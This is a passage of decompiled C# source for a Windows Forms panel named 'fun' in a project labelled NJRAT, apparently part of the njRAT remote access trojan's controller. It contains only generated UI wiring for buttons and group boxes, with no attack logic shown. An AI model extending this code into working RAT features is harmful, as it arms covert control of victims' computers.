using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000013 RID: 19
	[DesignerGenerated]
	public partial class fun : Form
	{
		// Token: 0x06000200 RID: 512 RVA: 0x00159A2C File Offset: 0x00157E2C
		[DebuggerNonUserCode]
		public fun()
		{
			fun.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x06000201 RID: 513 RVA: 0x00159A44 File Offset: 0x00157E44
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = fun.__ENCList;
			lock (_ENCList)
			{
				bool flag = fun.__ENCList.Count == fun.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = fun.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = fun.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								fun.__ENCList[num] = fun.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					fun.__ENCList.RemoveRange(num, fun.__ENCList.Count - num);
					fun.__ENCList.Capacity = fun.__ENCList.Count;
				}
				fun.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x06000204 RID: 516 RVA: 0x0015D940 File Offset: 0x0015BD40
		// (set) Token: 0x06000205 RID: 517 RVA: 0x0015D958 File Offset: 0x0015BD58
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x06000206 RID: 518 RVA: 0x0015D964 File Offset: 0x0015BD64
		// (set) Token: 0x06000207 RID: 519 RVA: 0x0015D97C File Offset: 0x0015BD7C
		internal virtual GroupBox GroupBox7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox7 = value;
			}
		}

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x06000208 RID: 520 RVA: 0x0015D988 File Offset: 0x0015BD88
		// (set) Token: 0x06000209 RID: 521 RVA: 0x0015D9A0 File Offset: 0x0015BDA0
		internal virtual Button Button14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button14_Click);
				bool flag = this._Button14 != null;
				if (flag)
				{
					this._Button14.Click -= eventHandler;
				}
				this._Button14 = value;
				flag = this._Button14 != null;
				if (flag)
				{
					this._Button14.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x0600020A RID: 522 RVA: 0x0015DA00 File Offset: 0x0015BE00
		// (set) Token: 0x0600020B RID: 523 RVA: 0x0015DA18 File Offset: 0x0015BE18
		internal virtual Button Button15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button15_Click);
				bool flag = this._Button15 != null;
				if (flag)
				{
					this._Button15.Click -= eventHandler;
				}
				this._Button15 = value;
				flag = this._Button15 != null;
				if (flag)
				{
					this._Button15.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x0600020C RID: 524 RVA: 0x0015DA78 File Offset: 0x0015BE78
		// (set) Token: 0x0600020D RID: 525 RVA: 0x0015DA90 File Offset: 0x0015BE90
		internal virtual GroupBox GroupBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox2 = value;
			}
		}

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x0600020E RID: 526 RVA: 0x0015DA9C File Offset: 0x0015BE9C
		// (set) Token: 0x0600020F RID: 527 RVA: 0x0015DAB4 File Offset: 0x0015BEB4
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= eventHandler;
				}
				this._Button3 = value;
				flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000BB RID: 187
		// (get) Token: 0x06000210 RID: 528 RVA: 0x0015DB14 File Offset: 0x0015BF14
		// (set) Token: 0x06000211 RID: 529 RVA: 0x0015DB2C File Offset: 0x0015BF2C
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= eventHandler;
				}
				this._Button4 = value;
				flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x06000212 RID: 530 RVA: 0x0015DB8C File Offset: 0x0015BF8C
		// (set) Token: 0x06000213 RID: 531 RVA: 0x0015DBA4 File Offset: 0x0015BFA4
		internal virtual GroupBox GroupBox8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox8 = value;
			}
		}

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x06000214 RID: 532 RVA: 0x0015DBB0 File Offset: 0x0015BFB0
		// (set) Token: 0x06000215 RID: 533 RVA: 0x0015DBC8 File Offset: 0x0015BFC8
		internal virtual Button Button16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button16_Click);
				bool flag = this._Button16 != null;
				if (flag)
				{
					this._Button16.Click -= eventHandler;
				}
				this._Button16 = value;
				flag = this._Button16 != null;
				if (flag)
				{
					this._Button16.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x06000216 RID: 534 RVA: 0x0015DC28 File Offset: 0x0015C028
		// (set) Token: 0x06000217 RID: 535 RVA: 0x0015DC40 File Offset: 0x0015C040
		internal virtual Button Button17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button17_Click);
				bool flag = this._Button17 != null;
				if (flag)
				{
					this._Button17.Click -= eventHandler;
				}
				this._Button17 = value;
				flag = this._Button17 != null;
				if (flag)
				{
					this._Button17.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x06000218 RID: 536 RVA: 0x0015DCA0 File Offset: 0x0015C0A0
		// (set) Token: 0x06000219 RID: 537 RVA: 0x0015DCB8 File Offset: 0x0015C0B8
		internal virtual GroupBox GroupBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox6 = value;
			}
		}

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x0600021A RID: 538 RVA: 0x0015DCC4 File Offset: 0x0015C0C4
		// (set) Token: 0x0600021B RID: 539 RVA: 0x0015DCDC File Offset: 0x0015C0DC
		internal virtual Button Button22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button22_Click);
				bool flag = this._Button22 != null;
				if (flag)
				{
					this._Button22.Click -= eventHandler;
				}
				this._Button22 = value;
				flag = this._Button22 != null;
				if (flag)
				{
					this._Button22.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x0600021C RID: 540 RVA: 0x0015DD3C File Offset: 0x0015C13C
		// (set) Token: 0x0600021D RID: 541 RVA: 0x0015DD54 File Offset: 0x0015C154
		internal virtual Button Button23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button23_Click);
				bool flag = this._Button23 != null;
				if (flag)
				{
					this._Button23.Click -= eventHandler;
				}
				this._Button23 = value;
				flag = this._Button23 != null;
				if (flag)
				{
					this._Button23.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x0600021E RID: 542 RVA: 0x0015DDB4 File Offset: 0x0015C1B4
		// (set) Token: 0x0600021F RID: 543 RVA: 0x0015DDCC File Offset: 0x0015C1CC
		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x06000220 RID: 544 RVA: 0x0015DDD8 File Offset: 0x0015C1D8
		// (set) Token: 0x06000221 RID: 545 RVA: 0x0015DDF0 File Offset: 0x0015C1F0
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000222 RID: 546 RVA: 0x0015DE50 File Offset: 0x0015C250
		// (set) Token: 0x06000223 RID: 547 RVA: 0x0015DE68 File Offset: 0x0015C268
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= eventHandler;
				}
				this._Button2 = value;
				flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x06000224 RID: 548 RVA: 0x0015DEC8 File Offset: 0x0015C2C8
		// (set) Token: 0x06000225 RID: 549 RVA: 0x0015DEE0 File Offset: 0x0015C2E0
		internal virtual GroupBox GroupBox10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox10 = value;
			}
		}

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x06000226 RID: 550 RVA: 0x0015DEEC File Offset: 0x0015C2EC
		// (set) Token: 0x06000227 RID: 551 RVA: 0x0015DF04 File Offset: 0x0015C304
		internal virtual Button Button19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button19_Click);
				bool flag = this._Button19 != null;
				if (flag)
				{
					this._Button19.Click -= eventHandler;
				}
				this._Button19 = value;
				flag = this._Button19 != null;
				if (flag)
				{
					this._Button19.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x06000228 RID: 552 RVA: 0x0015DF64 File Offset: 0x0015C364
		// (set) Token: 0x06000229 RID: 553 RVA: 0x0015DF7C File Offset: 0x0015C37C
		internal virtual Button Button18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button18_Click);
				bool flag = this._Button18 != null;
				if (flag)
				{
					this._Button18.Click -= eventHandler;
				}
				this._Button18 = value;
				flag = this._Button18 != null;
				if (flag)
				{
					this._Button18.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x0600022A RID: 554 RVA: 0x0015DFDC File Offset: 0x0015C3DC
		// (set) Token: 0x0600022B RID: 555 RVA: 0x0015DFF4 File Offset: 0x0015C3F4
		internal virtual GroupBox GroupBox9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox9 = value;
			}
		}

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x0600022C RID: 556 RVA: 0x0015E000 File Offset: 0x0015C400
		// (set) Token: 0x0600022D RID: 557 RVA: 0x0015E018 File Offset: 0x0015C418
		internal virtual Button Button12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button12_Click);
				bool flag = this._Button12 != null;
				if (flag)
				{
					this._Button12.Click -= eventHandler;
				}
				this._Button12 = value;
				flag = this._Button12 != null;
				if (flag)
				{
					this._Button12.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x0600022E RID: 558 RVA: 0x0015E078 File Offset: 0x0015C478
		// (set) Token: 0x0600022F RID: 559 RVA: 0x0015E090 File Offset: 0x0015C490
		internal virtual Button Button13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button13_Click);
				bool flag = this._Button13 != null;
				if (flag)
				{
					this._Button13.Click -= eventHandler;
				}
				this._Button13 = value;
				flag = this._Button13 != null;
				if (flag)
				{
					this._Button13.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000230 RID: 560 RVA: 0x0015E0F0 File Offset: 0x0015C4F0
		// (set) Token: 0x06000231 RID: 561 RVA: 0x0015E108 File Offset: 0x0015C508
		internal virtual GroupBox GroupBox11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox11 = value;
			}
		}

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x06000232 RID: 562 RVA: 0x0015E114 File Offset: 0x0015C514
		// (set) Token: 0x06000233 RID: 563 RVA: 0x0015E12C File Offset: 0x0015C52C
		internal virtual Button Button21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button21_Click);
				bool flag = this._Button21 != null;
				if (flag)
				{
					this._Button21.Click -= eventHandler;
				}
				this._Button21 = value;
				flag = this._Button21 != null;
				if (flag)
				{
					this._Button21.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x06000234 RID: 564 RVA: 0x0015E18C File Offset: 0x0015C58C
		// (set) Token: 0x06000235 RID: 565 RVA: 0x0015E1A4 File Offset: 0x0015C5A4
		internal virtual Button Button20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button20_Click);
				bool flag = this._Button20 != null;
				if (flag)
				{
					this._Button20.Click -= eventHandler;
				}
				this._Button20 = value;
				flag = this._Button20 != null;
				if (flag)
				{
					this._Button20.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x06000236 RID: 566 RVA: 0x0015E204 File Offset: 0x0015C604
		// (set) Token: 0x06000237 RID: 567 RVA: 0x0015E21C File Offset: 0x0015C61C
		internal virtual GroupBox GroupBox25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox25 = value;
			}
		}

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x06000238 RID: 568 RVA: 0x0015E228 File Offset: 0x0015C628
		// (set) Token: 0x06000239 RID: 569 RVA: 0x0015E240 File Offset: 0x0015C640
		internal virtual Button Button28
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button28;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button28_Click);
				bool flag = this._Button28 != null;
				if (flag)
				{
					this._Button28.Click -= eventHandler;
				}
				this._Button28 = value;
				flag = this._Button28 != null;
				if (flag)
				{
					this._Button28.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x0600023A RID: 570 RVA: 0x0015E2A0 File Offset: 0x0015C6A0
		// (set) Token: 0x0600023B RID: 571 RVA: 0x0015E2B8 File Offset: 0x0015C6B8
		internal virtual Button Button29
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button29;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button29_Click);
				bool flag = this._Button29 != null;
				if (flag)
				{
					this._Button29.Click -= eventHandler;
				}
				this._Button29 = value;
				flag = this._Button29 != null;
				if (flag)
				{
					this._Button29.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x0600023C RID: 572 RVA: 0x0015E318 File Offset: 0x0015C718
		// (set) Token: 0x0600023D RID: 573 RVA: 0x0015E330 File Offset: 0x0015C730
		internal virtual GroupBox GroupBox19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox19 = value;
			}
		}

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x0600023E RID: 574 RVA: 0x0015E33C File Offset: 0x0015C73C
		// (set) Token: 0x0600023F RID: 575 RVA: 0x0015E354 File Offset: 0x0015C754
		internal virtual Button Button37
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button37;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button37_Click);
				bool flag = this._Button37 != null;
				if (flag)
				{
					this._Button37.Click -= eventHandler;
				}
				this._Button37 = value;
				flag = this._Button37 != null;
				if (flag)
				{
					this._Button37.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x06000240 RID: 576 RVA: 0x0015E3B4 File Offset: 0x0015C7B4
		// (set) Token: 0x06000241 RID: 577 RVA: 0x0015E3CC File Offset: 0x0015C7CC
		internal virtual Button Button36
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button36;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button36_Click);
				bool flag = this._Button36 != null;
				if (flag)
				{
					this._Button36.Click -= eventHandler;
				}
				this._Button36 = value;
				flag = this._Button36 != null;
				if (flag)
				{
					this._Button36.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x06000242 RID: 578 RVA: 0x0015E42C File Offset: 0x0015C82C
		// (set) Token: 0x06000243 RID: 579 RVA: 0x0015E444 File Offset: 0x0015C844
		internal virtual TextBox TextBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox4 = value;
			}
		}

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x06000244 RID: 580 RVA: 0x0015E450 File Offset: 0x0015C850
		// (set) Token: 0x06000245 RID: 581 RVA: 0x0015E468 File Offset: 0x0015C868
		internal virtual Button Button56
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button56;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button56_Click);
				bool flag = this._Button56 != null;
				if (flag)
				{
					this._Button56.Click -= eventHandler;
				}
				this._Button56 = value;
				flag = this._Button56 != null;
				if (flag)
				{
					this._Button56.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x06000246 RID: 582 RVA: 0x0015E4C8 File Offset: 0x0015C8C8
		// (set) Token: 0x06000247 RID: 583 RVA: 0x0015E4E0 File Offset: 0x0015C8E0
		internal virtual GroupBox GroupBox18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox18 = value;
			}
		}

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x06000248 RID: 584 RVA: 0x0015E4EC File Offset: 0x0015C8EC
		// (set) Token: 0x06000249 RID: 585 RVA: 0x0015E504 File Offset: 0x0015C904
		internal virtual Button Button40
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button40;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button40_Click);
				bool flag = this._Button40 != null;
				if (flag)
				{
					this._Button40.Click -= eventHandler;
				}
				this._Button40 = value;
				flag = this._Button40 != null;
				if (flag)
				{
					this._Button40.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x0600024A RID: 586 RVA: 0x0015E564 File Offset: 0x0015C964
		// (set) Token: 0x0600024B RID: 587 RVA: 0x0015E57C File Offset: 0x0015C97C
		internal virtual Button Button41
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button41;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button41_Click);
				bool flag = this._Button41 != null;
				if (flag)
				{
					this._Button41.Click -= eventHandler;
				}
				this._Button41 = value;
				flag = this._Button41 != null;
				if (flag)
				{
					this._Button41.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x0600024C RID: 588 RVA: 0x0015E5DC File Offset: 0x0015C9DC
		// (set) Token: 0x0600024D RID: 589 RVA: 0x0015E5F4 File Offset: 0x0015C9F4
		internal virtual Button Button42
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button42;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button42_Click);
				bool flag = this._Button42 != null;
				if (flag)
				{
					this._Button42.Click -= eventHandler;
				}
				this._Button42 = value;
				flag = this._Button42 != null;
				if (flag)
				{
					this._Button42.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x0600024E RID: 590 RVA: 0x0015E654 File Offset: 0x0015CA54
		// (set) Token: 0x0600024F RID: 591 RVA: 0x0015E66C File Offset: 0x0015CA6C
		internal virtual Button Button43
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button43;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button43_Click);
				bool flag = this._Button43 != null;
				if (flag)
				{
					this._Button43.Click -= eventHandler;
				}
				this._Button43 = value;
				flag = this._Button43 != null;
				if (flag)
				{
					this._Button43.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x06000250 RID: 592 RVA: 0x0015E6CC File Offset: 0x0015CACC
		// (set) Token: 0x06000251 RID: 593 RVA: 0x0015E6E4 File Offset: 0x0015CAE4
		internal virtual Button Button44
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button44;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button44_Click);
				bool flag = this._Button44 != null;
				if (flag)
				{
					this._Button44.Click -= eventHandler;
				}
				this._Button44 = value;
				flag = this._Button44 != null;
				if (flag)
				{
					this._Button44.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x06000252 RID: 594 RVA: 0x0015E744 File Offset: 0x0015CB44
		// (set) Token: 0x06000253 RID: 595 RVA: 0x0015E75C File Offset: 0x0015CB5C
		internal virtual Button Button45
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button45;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button45_Click);
				bool flag = this._Button45 != null;
				if (flag)
				{
					this._Button45.Click -= eventHandler;
				}
				this._Button45 = value;
				flag = this._Button45 != null;
				if (flag)
				{
					this._Button45.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x06000254 RID: 596 RVA: 0x0015E7BC File Offset: 0x0015CBBC
		// (set) Token: 0x06000255 RID: 597 RVA: 0x0015E7D4 File Offset: 0x0015CBD4
		internal virtual Button Button46
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button46;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button46_Click);
				bool flag = this._Button46 != null;
				if (flag)
				{
					this._Button46.Click -= eventHandler;
				}
				this._Button46 = value;
				flag = this._Button46 != null;
				if (flag)
				{
					this._Button46.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x06000256 RID: 598 RVA: 0x0015E834 File Offset: 0x0015CC34
		// (set) Token: 0x06000257 RID: 599 RVA: 0x0015E84C File Offset: 0x0015CC4C
		internal virtual Button Button47
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button47;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button47_Click);
				bool flag = this._Button47 != null;
				if (flag)
				{
					this._Button47.Click -= eventHandler;
				}
				this._Button47 = value;
				flag = this._Button47 != null;
				if (flag)
				{
					this._Button47.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x06000258 RID: 600 RVA: 0x0015E8AC File Offset: 0x0015CCAC
		// (set) Token: 0x06000259 RID: 601 RVA: 0x0015E8C4 File Offset: 0x0015CCC4
		internal virtual Button Button48
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button48;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button48_Click);
				bool flag = this._Button48 != null;
				if (flag)
				{
					this._Button48.Click -= eventHandler;
				}
				this._Button48 = value;
				flag = this._Button48 != null;
				if (flag)
				{
					this._Button48.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x0600025A RID: 602 RVA: 0x0015E924 File Offset: 0x0015CD24
		// (set) Token: 0x0600025B RID: 603 RVA: 0x0015E93C File Offset: 0x0015CD3C
		internal virtual Button Button49
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button49;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button49_Click);
				bool flag = this._Button49 != null;
				if (flag)
				{
					this._Button49.Click -= eventHandler;
				}
				this._Button49 = value;
				flag = this._Button49 != null;
				if (flag)
				{
					this._Button49.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x0600025C RID: 604 RVA: 0x0015E99C File Offset: 0x0015CD9C
		// (set) Token: 0x0600025D RID: 605 RVA: 0x0015E9B4 File Offset: 0x0015CDB4
		internal virtual Button Button50
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button50;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button50_Click);
				bool flag = this._Button50 != null;
				if (flag)
				{
					this._Button50.Click -= eventHandler;
				}
				this._Button50 = value;
				flag = this._Button50 != null;
				if (flag)
				{
					this._Button50.Click += eventHandler;
				}
			}
